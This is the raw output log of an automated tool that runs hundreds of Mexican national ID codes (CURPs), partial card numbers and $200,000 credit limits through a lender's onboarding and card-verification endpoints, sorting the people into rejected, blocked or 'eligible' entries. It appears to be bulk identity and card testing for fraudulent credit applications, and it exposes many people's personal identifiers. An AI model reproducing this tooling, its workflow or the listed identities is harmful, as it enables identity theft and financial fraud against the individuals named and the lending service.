[290] ID:3207019 | GARR790215HQRMCC05 | $200,000 | QUINTANA ROO | T:4396... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.6s)
[291] ID:3210026 | CAHG700511HDFRRS04 | $200,000 | CIUDAD DE ME | T:8215... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6643 para ID:3174312 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[292] ID:3232109 | AADB700809MBCLRL05 | $200,000 | BAJA CALIFOR | T:6833... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[293] ID:3237678 | VEDL730917HMNGRS07 | $200,000 | MICHOACAN | T:9243... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.2s)
[294] ID:3238526 | DOMM711111MCHMNR08 | $200,000 | CHIHUAHUA | T:6369... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[295] ID:3239425 | BEGS690629HJCCMR02 | $200,000 | JALISCO | T:4665... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.0s)
[296] ID:3240423 | TOHE701226HNLRNL09 | $200,000 | NUEVO LEON | T:7334... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9243 para ID:3237678 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[297] ID:3247682 | RURL730816MDFZDT08 | $200,000 | CIUDAD DE ME | T:4742... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.1s)
[298] ID:3275602 | SATC711208MSONVN00 | $200,000 | SINALOA | T:7770... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[299] ID:3276872 | VEGS721129HGTRRB04 | $200,000 | GUANAJUATO | T:9104... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.5s)
[300] ID:3283118 | LARD750130HASLVN03 | $200,000 | AGUASCALIENT | T:5681... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[301] ID:3317743 | RICA710811HDFVRL08 | $200,000 | CIUDAD DE ME | T:7555... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[302] ID:3324033 | ROII710722HMCMSG01 | $200,000 | ESTADO DE ME | T:3668... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (17.0s)
[303] ID:3361246 | CAVR740825HCHRLY08 | $200,000 | CHIHUAHUA | T:2811... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (17.8s)
[304] ID:3362374 | TOFD690401MTCRLR00 | $200,000 | TABASCO | T:7511... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.8s)
[305] ID:3362710 | ROVJ720309HNLDRN07 | $200,000 | NUEVO LEON | T:5492... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[306] ID:3363196 | PERL710813MGTRZR09 | $200,000 | GUANAJUATO | T:0754... [307] ID:3392590 | ZAMC700430MMNVDR04 | $200,000 | MICHOACAN | T:8767... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[308] ID:3400814 | CALS720606HTSSLL07 | $200,000 | TAMAULIPAS | T:0349... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.0s)
[309] ID:3402839 | MARR730911HDFRJF03 | $200,000 | CIUDAD DE ME | T:0698... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8767 para ID:3392590 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[310] ID:3427369 | AIGF700709HNTRRR04 | $200,000 | NAYARIT | T:7716... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.8s)
[311] ID:3432062 | AIBA720619HQTVRR06 | $200,000 | QUERETARO | T:6032... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[312] ID:3436803 | COHA790414HOCNRN03 | $200,000 | OAXACA | T:9272... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0349 para ID:3400814 ($200,000)... [🔴 OFF] Rechazo bancario (PE170) (18.4s)
[313] ID:3459365 | AAGJ780902HJCLNM06 | $200,000 | JALISCO | T:0837... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.6s)
[314] ID:3461107 | DEFY690314MMCLLL09 | $200,000 | ESTADO DE ME | T:5116... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[315] ID:3469604 | CEVJ710323HDFRLS00 | $200,000 | CIUDAD DE ME | T:0144... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.4s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0837 para ID:3459365 ($200,000)... [316] ID:3470227 | GANS700927HTSRNR03 | $200,000 | TAMAULIPAS | T:0937... [🔴 OFF] Rechazo bancario (PE170) (14.8s)
[317] ID:3474330 | LARE750902HQTRCD02 | $200,000 | QUERETARO | T:3081... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[318] ID:3475850 | VEOI730222HSOGRS01 | $200,000 | SONORA | T:6036... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[319] ID:3488623 | GOSL690222MJCNNZ01 | $200,000 | JALISCO | T:5670... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.7s)
[320] ID:3508289 | MOHF690717HMCRRR03 | $200,000 | ESTADO DE ME | T:4878... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[321] ID:3522026 | ZARC730605MDFHML03 | $200,000 | CIUDAD DE ME | T:9144... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.4s)
[322] ID:3546113 | LOPL780614MJCPRZ01 | $200,000 | JALISCO | T:8467... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.2s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9144 para ID:3522026 ($200,000)... [323] ID:3549274 | MOCJ751114HJCRRM01 | $200,000 | JALISCO | T:5674... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE020) (11.3s)
[324] ID:3574630 | BEGV730728HNTLLC00 | $200,000 | NAYARIT | T:1189... [🔴 OFF] Rechazo bancario (PE150) (16.9s)
[325] ID:3578572 | AICE800929MDFRHR01 | $200,000 | CIUDAD DE ME | T:9954... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.6s)
[326] ID:3579427 | PERI690125MMCRSR07 | $200,000 | ESTADO DE ME | T:1395... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.4s)
[327] ID:3593972 | BUTJ710521HJCNRN08 | $200,000 | JALISCO | T:9634... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9954 para ID:3578572 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[328] ID:3605255 | AUGM730104HSOHNN08 | $200,000 | SONORA | T:8407... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[329] ID:3607094 | MEBR740314HCHNLC04 | $200,000 | CHIHUAHUA | T:3943... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[330] ID:3612257 | RACF701113HJCNRR09 | $200,000 | JALISCO | T:3857... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[⚠️ RETRY] Excepción red: Failed to perform, curl: (28) Operation timed out after 6008 (12.3s)
[331] ID:3612906 | AANE710910HDFCCM01 | $200,000 | CIUDAD DE ME | T:6508... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.6s)
[332] ID:3624621 | REPR730312HJCYRC00 | $200,000 | JALISCO | T:1549... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (16.3s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3857 para ID:3612257 ($200,000)... [333] ID:3624742 | GURA710629HNLTML05 | $200,000 | NUEVO LEON | T:7858... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[334] ID:3625450 | GOCA710522MJCNSN00 | $200,000 | JALISCO | T:4884... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.4s)
[335] ID:3658025 | CASB780619HPLSSJ04 | $200,000 | PUEBLA | T:3600... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1549 para ID:3624621 ($200,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.3s)
[336] ID:3660465 | VAVM740618MGTLRR05 | $200,000 | GUANAJUATO | T:7138... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[337] ID:3664695 | VEBO820109MJCNLL02 | $200,000 | JALISCO | T:6412... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.6s)
[338] ID:3684833 | SAGR741116HTSLRB05 | $200,000 | TAMAULIPAS | T:7952... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4884 para ID:3625450 ($200,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.4s)
[339] ID:3700262 | RIMF741203HGRVCR04 | $200,000 | GUERRERO | T:1888... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (15.0s)
[340] ID:3706706 | PIMC780509MJCZRL00 | $200,000 | JALISCO | T:3933... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.2s)
[341] ID:3732574 | CATE691029MCGLRG09 | $200,000 | COAHUILA | T:4610... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.5s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[342] ID:3735455 | GUNA780104MDGNDN09 | $200,000 | DURANGO | T:8872... [343] ID:3742221 | IIRA700727HBCNZN01 | $200,000 | BAJA CALIFOR | T:7856... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[344] ID:3773528 | CAMG760106HBSSYR05 | $200,000 | BAJA CALIFOR | T:7502... [🔴 OFF] Rechazo bancario (PE170) (14.3s)
[345] ID:3776285 | TEAI791017HGTRCG08 | $200,000 | GUANAJUATO | T:5862... [🔴 OFF] Rechazo bancario (PE170) (14.3s)
[346] ID:3803660 | AUHJ750916HDFGRN02 | $200,000 | CIUDAD DE ME | T:6584... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.6s)
[347] ID:3810856 | NOGA720106HSPVRD00 | $200,000 | SAN LUIS POT | T:5679... [🔴 OFF] Rechazo bancario (PE170) (17.0s)
[348] ID:3811978 | OOAT690124MNLRRR08 | $200,000 | NUEVO LEON | T:4047... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[349] ID:3822602 | IIAF700506HSONGR06 | $200,000 | SONORA | T:3209... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.6s)
[350] ID:3847510 | BARJ730507HNLKDR05 | $200,000 | NUEVO LEON | T:4628... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[351] ID:3848847 | PEVM741219HPLRZG01 | $200,000 | PUEBLA | T:8502... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.9s)
[352] ID:3851772 | PESE710601MCMRNM04 | $200,000 | COLIMA | T:2269... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4628 para ID:3847510 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[353] ID:3858016 | LOAL760518HJCPNS09 | $200,000 | JALISCO | T:3203... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.2s)
[354] ID:3860715 | SADJ700211HHGLZR02 | $200,000 | HIDALGO | T:2676... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[355] ID:3875109 | FARJ790503HGTRML01 | $200,000 | GUANAJUATO | T:9960... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.3s)
[356] ID:3880489 | OECL690923HDFRSS08 | $200,000 | CIUDAD DE ME | T:3256... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.1s)
[357] ID:3918743 | RUTM720801MMCZVR04 | $200,000 | ESTADO DE ME | T:4538... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.1s)
[358] ID:3921442 | LAGM760310HGTRTG01 | $200,000 | GUANAJUATO | T:3346... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.3s)
[359] ID:3941193 | LUGJ690902HBCLNN05 | $200,000 | BAJA CALIFOR | T:3664... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.3s)
[360] ID:3942474 | SAIH690120HMNNBM00 | $200,000 | MICHOACAN | T:3267... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3346 para ID:3921442 ($200,000)... [🔴 OFF] Rechazo bancario (PE170) (13.8s)
[361] ID:3950064 | REMA721223HDFYRL04 | $200,000 | CIUDAD DE ME | T:9041... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[362] ID:3952961 | GALI700112HNLRVV02 | $200,000 | NUEVO LEON | T:0097... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (13.2s)
[363] ID:3955824 | ROCM700709HQRSRG05 | $200,000 | QUINTANA ROO | T:2245... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[364] ID:3982843 | DEKO741223HVRLRM01 | $200,000 | VERACRUZ | T:1172... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[365] ID:4001568 | PESR730923HSORMB07 | $200,000 | SONORA | T:7238... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.6s)
[366] ID:4005818 | SIBR770901HBCLDD08 | $200,000 | TIJUANA | T:2507... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[367] ID:4008076 | OODY730315MMNSMZ08 | $200,000 | MICHOACAN | T:5069... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.4s)
[368] ID:4008417 | CASB710801HSORTR04 | $200,000 | SINALOA | T:8026... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[369] ID:4039074 | BURL761122HDFTBS07 | $200,000 | CIUDAD DE ME | T:0266... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[370] ID:4039376 | ZENJ751115HCMPVR06 | $200,000 | COLIMA | T:4164... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.7s)
[371] ID:4042163 | TEAI791017HGTRCG08 | $200,000 | GUANAJUATO | T:5326... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0266 para ID:4039074 ($200,000)... [🔴 OFF] Rechazo bancario (PE170) (14.0s)
[372] ID:4049621 | FOMC741123HHGLLR09 | $200,000 | HIDALGO | T:3115... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.6s)
[373] ID:4065567 | OILO770723HBSRNM05 | $200,000 | BAJA CALIFOR | T:6338... [🔴 OFF] Rechazo bancario (PE110) (13.4s)
[374] ID:4080518 | GARR790914HTSRZB07 | $200,000 | TAMAULIPAS | T:5718... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[375] ID:4101113 | GAGO690113HMSRDM00 | $200,000 | MORELOS | T:5232... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.0s)
[376] ID:4111421 | CEGC691001HYCHRR04 | $200,000 | YUCATAN | T:7584... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5718 para ID:4080518 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[377] ID:4119967 | PAAJ730714HMCCQV01 | $200,000 | ESTADO DE ME | T:9759... [🔴 OFF] Contacto preexistente (/confirm-contact) (18.7s)
[378] ID:4122907 | AOCI720401HYNLCN05 | $200,000 | YUCATAN | T:5633... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[379] ID:4124350 | CALM740614HYCHZR00 | $200,000 | YUCATAN | T:6743... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.8s)
[380] ID:4125321 | OIHG700216HVRLYR01 | $200,000 | VERACRUZ | T:9212... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.1s)
[381] ID:4126506 | SASA710225HZSLLL02 | $200,000 | ZACATECAS | T:1046... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[382] ID:4155024 | MEAA700128HTCRLR09 | $200,000 | TABASCO | T:7157... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[383] ID:4159780 | TOVR690123HJCSZC08 | $200,000 | JALISCO | T:8804... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.4s)
[384] ID:4179543 | VIAL740727HJCLLS06 | $200,000 | JALISCO | T:1869... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.1s)
[385] ID:4180113 | HEAI730201HMCRGN03 | $200,000 | ESTADO DE ME | T:1106... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.1s)
[386] ID:4190421 | LORU010101MDFQMTA1 | $200,000 | CIUDAD DE ME | T:3752... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[387] ID:4194943 | EIAM750206HYCSVN08 | $200,000 | YUCATAN | T:5711... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.5s)
[388] ID:4200298 | VADL801215MJCLZR06 | $200,000 | JALISCO | T:0921... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1106 para ID:4180113 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[389] ID:4223310 | PETC710128MCHRLL01 | $200,000 | CHIHUAHUA | T:4063... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.1s)
[390] ID:4223536 | EETR790226HNLSJD06 | $200,000 | NUEVO LEON | T:3339... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[391] ID:4223835 | MOAB760126MGTZLL08 | $200,000 | GUANAJUATO | T:3639... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.6s)
[392] ID:4226371 | ZERA760128HNLNYR05 | $200,000 | NUEVO LEON | T:0200... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3339 para ID:4223536 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.5s)

[+] Lote de 500 candidatos precargados con límite >= $50,000 (1969+)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[393] ID:4230688 | LOGM700410MJCPNR02 | $200,000 | JALISCO | T:5783... [394] ID:4231395 | ROSK760516MJCMCR09 | $200,000 | JALISCO | T:4316... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[395] ID:4235133 | AEMM701112HDFCNR08 | $200,000 | CIUDAD DE ME | T:1749... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.6s)
[396] ID:4272546 | GOCM720321MMCNBG00 | $200,000 | ESTADO DE ME | T:1482... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[397] ID:4272897 | CASE721127HMCLRD02 | $200,000 | ESTADO DE ME | T:1087... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[398] ID:4278729 | BUVS700718HMNCLN00 | $200,000 | MICHOACAN | T:1300... [🔴 OFF] Contacto preexistente (/confirm-contact) (19.8s)
[399] ID:4284723 | REPC710420HTSNLR04 | $200,000 | TAMAULIPAS | T:5118... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[🔴 OFF] Rechazo bancario (PE1002) (13.3s)
[400] ID:4299930 | CIMA740210MDGHCN09 | $200,000 | DURANGO | T:9518... [401] ID:4305235 | PAAL811130MDFZLL05 | $200,000 | CIUDAD DE ME | T:5865... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[402] ID:4306871 | GOGC760225HZSMRS07 | $200,000 | ZACATECAS | T:0382... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[403] ID:4313358 | RINM740211HMNVNR07 | $200,000 | MICHOACAN | T:0806... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[404] ID:4317805 | UIVE760430MBSRGL00 | $200,000 | BAJA CALIFOR | T:0995... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.6s)
[405] ID:4320064 | FEAS731111MMNRMN03 | $200,000 | MICHOACAN | T:7785... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0382 para ID:4306871 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.1s)
[406] ID:4331622 | PAWS770615HTSLLR06 | $200,000 | TAMAULIPAS | T:4630... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[407] ID:4332220 | CASG820114MMCRLB06 | $200,000 | ESTADO DE ME | T:3970... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.2s)
[408] ID:4341029 | PEBM750422MTCRTR01 | $200,000 | TABASCO | T:3105... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[409] ID:4344253 | SELN730608MMCDBN04 | $200,000 | ESTADO DE ME | T:4448... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[410] ID:4347349 | GUOP791116HSPTRX04 | $200,000 | SAN LUIS POT | T:7906... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.2s)
[411] ID:4354265 | HEGI720603HMNRRS06 | $200,000 | MICHOACAN | T:8123... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3105 para ID:4341029 ($200,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.9s)
[412] ID:4378160 | VIAJ690727HSOLLS07 | $200,000 | SONORA | T:1269... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[413] ID:4385606 | LERJ730110HNLLDR09 | $200,000 | NUEVO LEON | T:8517... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.8s)
[414] ID:4386520 | GOGJ701111HSONNS03 | $200,000 | SONORA | T:2685... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.8s)
[415] ID:4390943 | CARV720829HVRDMC06 | $200,000 | VERACRUZ | T:4013... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.8s)
[416] ID:4420365 | REME740904HJCYYD06 | $200,000 | JALISCO | T:5418... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[417] ID:4429895 | RAAG690630HMCMRR01 | $200,000 | ESTADO DE ME | T:8428... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[418] ID:4448893 | RAPE701021MSPMLM06 | $200,000 | SAN LUIS POT | T:9648... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.1s)
[419] ID:4455307 | BETS700909HDFTRR08 | $200,000 | CIUDAD DE ME | T:5176... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5418 para ID:4420365 ($200,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.8s)
[420] ID:4459794 | KAAJ700818HCHNNM02 | $200,000 | CHIHUAHUA | T:3613... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[421] ID:4462724 | MOVJ721225HMCLLS01 | $200,000 | ESTADO DE ME | T:0131... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.6s)
[422] ID:4465811 | GOGE711122HQTNND08 | $200,000 | QUERETARO | T:1290... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9648 para ID:4448893 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[423] ID:4479180 | CARX730321MJCSVC07 | $200,000 | JALISCO | T:9553... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.6s)
[424] ID:4501777 | VAJG690813HTSRRR08 | $200,000 | TAMAULIPAS | T:3133... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.0s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.8s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9553 para ID:4479180 ($200,000)... [425] ID:4531027 | NAKA740807HGTVLR09 | $200,000 | GUANAJUATO | T:9897... [426] ID:4535176 | LOHR730920HMCPRF00 | $200,000 | ESTADO DE ME | T:2589... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[427] ID:4539407 | PEDJ690317HYCRNR05 | $200,000 | YUCATAN | T:1001... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[428] ID:4539731 | SACG710511HCPCRB00 | $200,000 | CAMPECHE | T:5349... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.5s)
[429] ID:4540311 | MASR690206HVRZNB00 | $200,000 | VERACRUZ | T:6185... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[430] ID:4540925 | AARR710729MNLLYS08 | $200,000 | NUEVO LEON | T:4487... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[431] ID:4545168 | GOGL780214HTSNRP01 | $200,000 | TAMAULIPAS | T:4148... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[432] ID:4563338 | SACJ740926HCHNRR05 | $200,000 | CHIHUAHUA | T:3137... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.9s)
[433] ID:4570248 | EIGC740517MJCNNL07 | $200,000 | JALISCO | T:6240... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4487 para ID:4540925 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.7s)
[434] ID:4574810 | SAMF760220HNLLRR09 | $200,000 | NUEVO LEON | T:6161... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.0s)
[435] ID:4576875 | OICJ760722HCHRBR06 | $200,000 | CHIHUAHUA | T:5475... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6240 para ID:4570248 ($200,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.3s)
[436] ID:4581988 | MIRR711222HSPRMB01 | $200,000 | SAN LUIS POT | T:7571... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.8s)
[437] ID:4584279 | VADA740518HMCZLL00 | $200,000 | ESTADO DE ME | T:5416... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6161 para ID:4574810 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.2s)
[438] ID:4602674 | SEDA010101HDFRNNA1 | $200,000 | CIUDAD DE ME | T:2069... [439] ID:4614609 | OIGC700524HCPRZL06 | $200,000 | CAMPECHE | T:2795... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
